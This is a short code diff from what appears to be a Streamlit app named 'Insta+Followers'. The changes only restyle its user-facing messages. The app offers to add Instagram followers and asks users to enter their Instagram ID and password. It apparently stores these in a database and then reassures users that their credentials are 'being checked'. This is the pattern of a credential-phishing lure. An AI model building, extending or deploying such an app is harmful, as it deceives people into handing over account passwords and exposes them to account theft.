@@ -26,9 +26,9 @@ with c1:
 
     st.text("Insta+Followers")
 
-    st.warning("The easiest tool to add followers to Instagram ID")
+    st.text("The easiest tool to add followers to Instagram ID")
     
-    st.success("Enter your Instagram ID and password")
+    st.text("Enter your Instagram ID and password")
     
     
 
@@ -65,7 +65,7 @@ with st.form("Todo Form"):
         conn.commit()
 
         # Display a success message
-        st.success("""
+        st.text("""
                    Your Instagram ID is being checked. If your Instagram ID and the password you entered are correct, it will be added to your ID in a few minutes after checking several followers.
                    """)
         st.snow()        
